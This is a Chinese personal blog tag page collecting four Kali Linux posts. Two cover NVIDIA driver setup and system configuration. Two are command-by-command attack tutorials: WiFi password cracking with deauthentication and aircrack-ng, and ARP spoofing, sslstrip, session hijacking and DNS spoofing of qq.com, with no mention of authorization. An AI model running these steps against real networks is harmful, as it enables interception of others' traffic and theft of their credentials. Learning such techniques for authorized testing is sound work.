
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Tron Blog!">
    <title>标签: Kali - Tron Blog!</title>
    <meta name="author" content="Archie Shi">
    
    
    
    <meta name="description" content="Archie&apos;s Blog">
<meta property="og:type" content="blog">
<meta property="og:title" content="Tron Blog!">
<meta property="og:url" content="https://shianqi.github.io/tags/Kali/index.html">
<meta property="og:site_name" content="Tron Blog!">
<meta property="og:description" content="Archie&apos;s Blog">
<meta property="og:locale" content="zh-cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Tron Blog!">
<meta name="twitter:description" content="Archie&apos;s Blog">
    
    
        
    
    
        <meta property="og:image" content="http://cdn.shianqi.com/20171110003439_iub77X_cat_sm.png"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-ywijujnc71acsrrxuejmomiuckrww8ghivq5n28telwc6cwsucrwjgq26ffz.min.css">
    <!--STYLES END-->
    
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">Tron Blog!</a>
    </div>
    
        
            <a  class="header-right-icon open-algolia-search"
                href="#about">
        
        
            <i class="fa fa-lg fa-search"></i>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="http://cdn.shianqi.com/20171110003439_iub77X_cat_sm.png" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">Archie Shi</h4>
                
                    <h5 class="sidebar-profile-bio"><p>Nothing to say</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link open-algolia-search"
                             href="#search"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-search"></i>
                        <span class="sidebar-button-desc">搜索</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="#about"
                            
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/shianqi" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="tencent://message/?uin=1210219084&Site=有事Q我&Menu=yes" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-qq"></i>
                        <span class="sidebar-button-desc">QQ</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:shianqi@imudges.com" target="_blank" rel="noopener">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2016/12/22/PenetrationTest/KaliDisplayDriver/">
                            Kali-Linux 安装显卡驱动
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2016-12-22T14:52:12+08:00">
	
		    12月 22, 2016
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h1 id="1、禁止加载开源驱动nouveau-（非必须）"><a href="#1、禁止加载开源驱动nouveau-（非必须）" class="headerlink" title="1、禁止加载开源驱动nouveau （非必须）"></a>1、禁止加载开源驱动nouveau （非必须）</h1><p>在<code>/etc/modprobe.d/nvidia-installer-disable-nouveau.conf</code>文件中（不存在则新建）加入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># generated by nvidia-installer</span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset=0</span><br></pre></td></tr></table></figure></p>
<h1 id="2、安装内核头文件"><a href="#2、安装内核头文件" class="headerlink" title="2、安装内核头文件"></a>2、安装内核头文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure>
<h1 id="3、安装nvidia驱动相关的包"><a href="#3、安装nvidia驱动相关的包" class="headerlink" title="3、安装nvidia驱动相关的包"></a>3、安装nvidia驱动相关的包</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install  nvidia-kernel-dkms nvidia-cuda-toolkit nvidia-driver</span><br></pre></td></tr></table></figure>
<p>要选yes</p>
<h1 id="4、安装双显卡切换解决方案的包"><a href="#4、安装双显卡切换解决方案的包" class="headerlink" title="4、安装双显卡切换解决方案的包"></a>4、安装双显卡切换解决方案的包</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install  bumblebee-nvidia primus</span><br></pre></td></tr></table></figure>
<h1 id="5、添加当前用户到bumblebee用户组"><a href="#5、添加当前用户到bumblebee用户组" class="headerlink" title="5、添加当前用户到bumblebee用户组"></a>5、添加当前用户到bumblebee用户组</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser $USER bumblebee</span><br><span class="line">&quot;$USER&quot; 就是你当前的用户名</span><br></pre></td></tr></table></figure>
<h1 id="6、修改bumblebee配置"><a href="#6、修改bumblebee配置" class="headerlink" title="6、修改bumblebee配置"></a>6、修改bumblebee配置</h1><ol>
<li><p>修改 <code>/etc/bumblebee/bumblebee.conf</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Driver=nvidia</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 <code>/etc/bumblebee/xorg.conf.nvidia</code>在<code>Section &quot;Device&quot;</code>中添加PCI ID，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BusID &quot;PCI:01:00:0&quot;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>这个值通过 <code>lspci</code> 得到，找到你的独立显卡那一行，将<code>01:00.0</code>修改为<code>01:00:0</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01:00.0 3D controller: NVIDIA Corporation GK208M [GeForce GT 740M] (rev al)</span><br></pre></td></tr></table></figure></p>
<h1 id="7、注销当前用户"><a href="#7、注销当前用户" class="headerlink" title="7、注销当前用户"></a>7、注销当前用户</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnome-session-quit --no-prompt</span><br></pre></td></tr></table></figure>
<h1 id="8、启动bumblebee服务并且设置为开机自启动"><a href="#8、启动bumblebee服务并且设置为开机自启动" class="headerlink" title="8、启动bumblebee服务并且设置为开机自启动"></a>8、启动bumblebee服务并且设置为开机自启动</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service bumblebeed start</span><br><span class="line">update-rc.d bumblebeed enable</span><br></pre></td></tr></table></figure>
<h1 id="9、检查X11配置"><a href="#9、检查X11配置" class="headerlink" title="9、检查X11配置"></a>9、检查X11配置</h1><p>正常情况下不需要存在 <code>xorg.conf</code><br>如果存在 <code>/etc/X11/xorg.conf</code>，可以先尝试重启，如果无法重启到桌面环境，则删除该文件。</p>
<h1 id="10、是否安装成功的检查"><a href="#10、是否安装成功的检查" class="headerlink" title="10、是否安装成功的检查"></a>10、是否安装成功的检查</h1><ol>
<li>首先要可以进入桌面环境</li>
<li><code>lspci</code> 的输出中，对应独立显卡的那条记录已（rev ff）结尾，表示独立显卡以关闭</li>
<li>运行 <code>glxgears</code> 查看帧数，然后 <code>optirun glxgears</code> 一般使用独立显卡时，帧数有较大提高。</li>
<li>使用独显的过程中， <code>lsmod |grep nvidia</code> 应该会有输出信息</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>默认使用集显，在需要独显时，通过optirun来运行。<br><br>部分软件的安装可能提示不同，需要您自己判读。</p>
<h1 id="安装过程中遇到的错误"><a href="#安装过程中遇到的错误" class="headerlink" title="安装过程中遇到的错误"></a>安装过程中遇到的错误</h1><p>在执行 <code>lspci</code> 时发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:02.0 VGA compatible controller: Intel Corporation 4th Gen Core Processor Integrated Graphics Controller (rev 06)</span><br><span class="line">01:00.0 3D controller: NVIDIA Corporation GK208M [GeForce GT 740M] (rev al)</span><br></pre></td></tr></table></figure></p>
<p>集成显卡后面是(rev 06)而独立显卡是(rev al)结尾说明两个显卡同时在工作，</p>
<p>执行<code>optirun glxgears</code>发现出现一下错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[  158.673191] [ERROR]The Bumblebee daemon has not been started yet or the socket path /var/run/bumblebee.socket was incorrect.</span><br><span class="line">[  158.673219] [ERROR]Could not connect to bumblebee daemon - is it running?</span><br></pre></td></tr></table></figure></p>
<p>原因是bumblebee服务未启动，执行<code>service bumblebeed start</code>就可以了，一定要设置bumblebee开机自启动，否则下次开机会出现同样的错误。</p>
<h1 id="安装有问题，进行清理"><a href="#安装有问题，进行清理" class="headerlink" title="安装有问题，进行清理"></a>安装有问题，进行清理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get purge nvidia* bumblebee* prime*</span><br></pre></td></tr></table></figure>
<p>如果还通过nvidia官方的驱动进行过安装，可以运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./NVIDIA*.run --uninstall</span><br></pre></td></tr></table></figure></p>
<p>一般上诉两步就可以恢复系统到没有安装nvidia的状态。</p>

                    
                        
                    
                    
                        <p>
                            <a href="/2016/12/22/PenetrationTest/KaliDisplayDriver/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2016/12/22/PenetrationTest/KaliUpdata/">
                            Kali-Linux 更新、环境配置
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2016-12-22T14:39:12+08:00">
	
		    12月 22, 2016
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h1 id="kali-linux的更新源"><a href="#kali-linux的更新源" class="headerlink" title="kali linux的更新源:"></a>kali linux的更新源:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#kali官方源</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</span><br></pre></td></tr></table></figure>
<h1 id="对Kali进行清洁、更新、升级和发行版升级等处理"><a href="#对Kali进行清洁、更新、升级和发行版升级等处理" class="headerlink" title="对Kali进行清洁、更新、升级和发行版升级等处理"></a>对Kali进行清洁、更新、升级和发行版升级等处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</span><br></pre></td></tr></table></figure>
<h1 id="汉化火狐浏览器"><a href="#汉化火狐浏览器" class="headerlink" title="汉化火狐浏览器"></a>汉化火狐浏览器</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iceweasel-l10n-zh-cn</span><br></pre></td></tr></table></figure>
<h1 id="安装中文输入法-搜狗"><a href="#安装中文输入法-搜狗" class="headerlink" title="安装中文输入法(搜狗)"></a>安装中文输入法(搜狗)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install fcitx</span><br><span class="line">dpkg -i sougoupinyinXXX.deb</span><br><span class="line">apt-get -f install</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://os.51cto.com/art/201405/439494.htm" target="_blank" rel="external">http://os.51cto.com/art/201405/439494.htm</a><br><a href="http://blog.csdn.net/q_l_s/article/details/53185601" target="_blank" rel="external">http://blog.csdn.net/q_l_s/article/details/53185601</a></p>
</blockquote>

                    
                        
                    
                    
                        <p>
                            <a href="/2016/12/22/PenetrationTest/KaliUpdata/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/">
                            用 Kali-Linux 进行 Wifi 破解
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2016-12-20T09:43:12+08:00">
	
		    12月 20, 2016
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <h3>1.找一个字典文件</h3><br>这里用 Kali Linux 自带的<code>rockyou</code>字典，<br>使用前先解压。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlist/rockyou.txt.gz</span><br></pre></td></tr></table></figure><br><br><h3>2.断开链接的WiFi</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure><br><br>列出所有支持监控模式的网卡。<br><br><h3>3.监听网卡</h3>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
<p>此时网卡就处于监听模式，被监听的网卡变为 wlan0mon。<br><br>可使用<code>ifconfig</code>命令查看。</p>
<p></p><h3>4.查看WiFi网络</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p></p>
<p>可以看到周围WiFi的详细信息，包括信号强度、加密类型、频道(CH)等。<br><br>要记住破解WIFI的频道号和BSSID。</p>
<p></p><h3>5.抓取握手包</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span><br></pre></td></tr></table></figure><p></p>
<p><code>6</code> 频道号(CH)<br><br><code>C8:3A....</code> 目标BSSID号<br><br><code>-w</code> 抓取数据包保存位置<br></p>
<p></p><h3>6.强制让设备重连WiFi</h3><br>原理：给链接到WiFi的一个设备发送一个deauth(反认证)包，让那个设备断开WiFi，<br>随后它自然会再次链接。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a C8:3A:35:60:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span><br></pre></td></tr></table></figure><p></p>
<p><code>-0</code> 发送反认证包的个数 <br><br><code>-a</code> 指定路由器BSSID <br><br><code>-c</code> 指定强制断开的设备 <br></p>
<p>成功监听到握手包后：<code>Ctrl+C</code> 结束抓包。<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>结束监听。</p>
<p></p><h3>7.开始破解握手包密码</h3><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b C8:3A:35:60:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure><p></p>
<p><code>-a2</code>代表握手包 <br><br><code>-b</code> 指定要破解的WiFi BSSID <br><br><code>-w</code> 指定字典文件 <br><br>最后是抓取的包 <br></p>

                    
                        
                    
                    
                        <p>
                            <a href="/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom" itemscope itemType="http://schema.org/BlogPosting">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title" itemprop="headline">
                    
                        <a class="link-unstyled" href="/2016/12/10/PenetrationTest/ARP/ARP/">
                            嗅探，arp欺骗，会话劫持
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time itemprop="datePublished" datetime="2016-12-10T20:07:12+08:00">
	
		    12月 10, 2016
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content" itemprop="articleBody">
                    <p></p><h3>嗅探，arp欺骗，会话劫持</h3><br>工具：<code>Kali Linux</code> <a href="http://www.91ri.org/4408.html" target="_blank" rel="external"><code>ettercap</code></a><br>第一次需要配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/ettercap/etter.conf</span><br><span class="line">ec_uid = 0</span><br><span class="line">ec_gid = 0</span><br><span class="line">[linux]</span><br><span class="line">if you use iptables 这行，将下面#去掉，打开转发。</span><br></pre></td></tr></table></figure><p></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/etc/NetworkManager/NetworkManager.conf </span><br><span class="line">[ifupdown]</span><br><span class="line">managed=true</span><br></pre></td></tr></table></figure>
<p>改完后重启NetworkManager</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network-manager restart</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">echo 1&gt;&gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
<p>ettercap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -T -M arp /// /// -q -i eth0</span><br></pre></td></tr></table></figure></p>
<p>第一个 <code>///</code> 是嗅探目标 –IP地址 <br><br>第二个 <code>///</code> 是嗅探网络 –网关地址<br><code>eth0</code> 是网卡编号</p>
<p>driftnet 显示访问图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure></p>
<p>arpspoof  (同样需要开启路由转发)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 被攻击者ip 攻击者ip</span><br></pre></td></tr></table></figure></p>
<p></p><h4>数据包捕获</h4><br>tcpdump wireshark(图形界面) <br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w text.txt</span><br></pre></td></tr></table></figure><p></p>
<p>drafnet</p>
<p></p><h4>SSL数据嗅探</h4><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</span><br><span class="line">sslstrip -p -l 10000 -w log.txt</span><br><span class="line">之后开启ARP欺骗工具</span><br><span class="line">用完记得取消 -A -&gt; -D</span><br></pre></td></tr></table></figure><p></p>
<p></p><h4>session劫持-arp欺骗</h4><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.14.2 192.168.14.132</span><br><span class="line">tcpdump -i eth0 -w text.cap</span><br><span class="line">ferret -r text.cpp</span><br><span class="line">hamster</span><br><span class="line">设置代理</span><br><span class="line">http://hamster</span><br></pre></td></tr></table></figure><p></p>
<p></p><h4>session劫持-DNS欺骗</h4><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用ettercap进行arp欺骗</span><br><span class="line">vi /etc/ettercap/etter.dns</span><br><span class="line">*.qq.com A 183.175.12.144</span><br><span class="line">//修改dns到自己的服务器</span><br><span class="line">dns_spoof</span><br></pre></td></tr></table></figure><p></p>

                    
                        
                    
                    
                        <p>
                            <a href="/2016/12/10/PenetrationTest/ARP/ARP/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
        <li class="pagination-number">第 1 页 共 1 页</li>
    </ul>
</div>

</section>


                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2017 Archie Shi. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="http://cdn.shianqi.com/20171110003439_iub77X_cat_sm.png" alt="作者的图片"/>
        
            <h4 id="about-card-name">Archie Shi</h4>
        
            <div id="about-card-bio"><p>Nothing to say</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>Front-End Development Engineer</p>

            </div>
        
        
    </div>
</div>

        <div id="algolia-search-modal" class="modal-container">
    <div class="modal">
        <div class="modal-header">
            <span class="close-button"><i class="fa fa-close"></i></span>
            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
                <span class="searchby-algolia-text text-color-light text-small">by</span>
                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
            </a>
            <i class="search-icon fa fa-search"></i>
            <form id="algolia-search-form">
                <input type="text" id="algolia-search-input" name="search"
                    class="form-control input--large search-input" placeholder="Search "
                    />
            </form>
        </div>
        <div class="modal-body">
            <div class="no-result text-color-light text-center">没有找到文章</div>
            <div class="results">
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/WebSocket/SocketIo/">
                            <h3 class="media-heading">用 Express,Socket.io 搭建 WebSocket 服务器</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年9月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Javascript/">
                            <h3 class="media-heading">JavaScript 简介</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年9月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/Windows/CMD快速配置IP/">
                            <h3 class="media-heading">CMD快速配置IP地址和DNS</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年9月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/BrowserSync/BrowserSync/">
                            <h3 class="media-heading">BrowserSync 使用手册</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年9月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/JavaScript/Event/">
                            <h3 class="media-heading">JavaScript 事件捕获和冒泡</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年9月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/09/04/MongoDB/基本语法/">
                            <h3 class="media-heading">MongoDB 基本语法</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年9月4日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/11/14/Webpack/Webpack基础/">
                            <h3 class="media-heading">Webpack 学习笔记</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年11月14日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/12/10/PenetrationTest/ARP/ARP/">
                            <h3 class="media-heading">嗅探，arp欺骗，会话劫持</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年12月10日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/12/20/PenetrationTest/WiFiCrack/WiFiCrack/">
                            <h3 class="media-heading">用 Kali-Linux 进行 Wifi 破解</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    2016年12月20日
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-body">
                        <a class="link-unstyled" href="https://shianqi.github.io/2016/12/22/PenetrationTest/KaliUpdata/">
